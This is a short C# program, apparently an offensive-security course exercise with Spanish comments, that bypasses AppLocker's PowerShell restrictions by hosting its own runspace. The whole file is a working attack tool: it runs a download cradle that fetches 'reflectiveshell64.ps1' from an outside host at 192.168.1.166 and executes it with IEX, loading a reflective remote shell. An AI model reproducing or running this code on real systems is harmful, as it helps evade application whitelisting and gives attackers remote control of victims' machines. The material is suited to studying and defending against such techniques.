using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace AppLocker_Powershell_Bypass_1
{
    class Program
    {
        static void Main(string[] args)
        {
            //Crea Runspace
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            //Crea instancia de Powershell y le asigna el Runspace anteriormente creado
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //Ejecuta código Powershell. En nuestro caso vuelca en un fichero la salida del comando $ExecutionContext.SessionState.LanguageMode
            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Users\\User\\Desktop\\osep\\Ejercicios\\8.3.2\\test.txt";

            //Descarga Shell reflectiva
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.1.166/reflectiveshell64.ps1') | IEX";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();

        }
    }
}
